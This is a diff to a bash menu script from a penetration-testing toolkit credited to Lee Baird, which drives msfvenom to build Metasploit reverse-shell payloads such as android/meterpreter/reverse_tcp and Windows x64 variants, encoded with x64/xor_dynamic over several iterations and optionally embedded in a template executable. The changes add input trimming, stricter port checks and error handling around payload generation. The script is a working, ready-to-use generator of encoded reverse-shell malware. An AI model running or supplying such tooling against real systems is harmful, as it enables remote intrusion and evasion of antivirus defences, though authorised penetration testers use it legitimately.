@@ -2,6 +2,25 @@
 
 # by Lee Baird (@discoverscripts)
 
+f_msfvenom_run(){
+    local output rc=0
+
+    output=$(mktemp)
+    echo "[*] Generating payload..."
+    msfvenom "$@" > "$output" 2>&1 || rc=$?
+    grep -E '^(Found |Attempting |Payload size:|[[:alnum:]_.+-]+ (succeeded|chosen))' "$output" || true
+    if [ "$rc" -ne 0 ]; then
+        echo
+        echo -e "${RED}[!] msfvenom failed.${NC}"
+        sed -e 's/\r$//' "$output" \
+            | grep -v -E '^(Running the|Existing database|Starting database|waiting for server|pg_ctl:|Examine the log|stopped waiting|failed)$' \
+            | sed '/^$/d' | head -10
+        echo
+    fi
+    rm -f "$output"
+    return $rc
+}
+
 clear
 f_banner
 
@@ -19,6 +38,8 @@ f_format(){
     echo
     echo -n "Choice: "
     read -r CHOICE2
+    CHOICE2="${CHOICE2#"${CHOICE2%%[![:space:]]*}"}"
+    CHOICE2="${CHOICE2%"${CHOICE2##*[![:space:]]}"}"
 
     case "$CHOICE2" in
         1) EXTENTION=".aspx"
@@ -35,7 +56,7 @@ f_format(){
             FORMAT="raw" ;;
         7) EXTENTION=".vba"
             FORMAT="vba" ;;
-        *) f_invalid ;;
+        *) f_invalid; exit 1 ;;
     esac
 }
 
@@ -61,6 +82,8 @@ echo "16.  Previous menu"
 echo
 echo -n "Choice: "
 read -r CHOICE
+CHOICE="${CHOICE#"${CHOICE%%[![:space:]]*}"}"
+CHOICE="${CHOICE%"${CHOICE##*[![:space:]]}"}"
 
 case "$CHOICE" in
     1) PAYLOAD="android/meterpreter/reverse_tcp"
@@ -136,8 +159,8 @@ case "$CHOICE" in
         ARCH="x64"
         PLATFORM="windows"
         f_format ;;
-    16) f_return_main ;;
-    *) f_invalid; exit ;;
+    16) exit 1 ;;
+    *) f_invalid; exit 1 ;;
 esac
 
 echo
@@ -162,8 +185,8 @@ if [ -z "$LPORT" ]; then
 fi
 
 # Check for valid port number.
-if [[ "$LPORT" -lt 1 || "$LPORT" -gt 65535 ]]; then
-    f_error
+if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || [[ "$LPORT" -lt 1 || "$LPORT" -gt 65535 ]]; then
+    f_invalid; exit 1
 fi
 
 echo -n "Iterations: "
@@ -176,8 +199,8 @@ if [ -z "$ITERATIONS" ]; then
 fi
 
 # Check for valid number that is reasonable.
-if [[ "$ITERATIONS" -lt 0 || "$ITERATIONS" -gt 20 ]]; then
-    f_error
+if ! [[ "$ITERATIONS" =~ ^[0-9]+$ ]] || [[ "$ITERATIONS" -lt 0 || "$ITERATIONS" -gt 20 ]]; then
+    f_invalid; exit 1
 fi
 
 X=$(echo "$PAYLOAD" | sed 's/\//-/g')
@@ -195,13 +218,36 @@ if [ "$ANSWER" == "y" ]; then
         echo "[*] Using /usr/share/windows-resources/binaries/whoami.exe"
     fi
 
+    TEMPLATE="${TEMPLATE/#\~/$HOME}"
+
     if [ ! -f "$TEMPLATE" ]; then
-        f_error
+        f_invalid; exit 1
     fi
 
+    OUTPUT_FILE="$HOME/data/$X-$LPORT-$ITERATIONS$EXTENTION"
     echo
-    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -x "$TEMPLATE" -e x64/xor_dynamic -i "$ITERATIONS" -o "$HOME"/data/"$X"-"$LPORT"-"$ITERATIONS""$EXTENTION"
+    if ! f_msfvenom_run -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -x "$TEMPLATE" -e x64/xor_dynamic -i "$ITERATIONS" -o "$OUTPUT_FILE"; then
+        f_invalid; exit 1
+    fi
 else
+    OUTPUT_FILE="$HOME/data/$X-$LPORT-$ITERATIONS$EXTENTION"
     echo
-    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -e x64/xor_dynamic -i "$ITERATIONS" -o "$HOME"/data/"$X"-"$LPORT"-"$ITERATIONS""$EXTENTION"
+    if ! f_msfvenom_run -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -e x64/xor_dynamic -i "$ITERATIONS" -o "$OUTPUT_FILE"; then
+        f_invalid; exit 1
+    fi
 fi
+
+if [ ! -s "$OUTPUT_FILE" ]; then
+    echo
+    echo -e "${RED}[!] Payload file was not created.${NC}"
+    echo
+    sleep 2
+    exit 1
+fi
+
+echo
+echo "$MEDIUM"
+echo
+echo -e "The new payload is located at ${YELLOW}$OUTPUT_FILE${NC}"
+echo
+exit 0
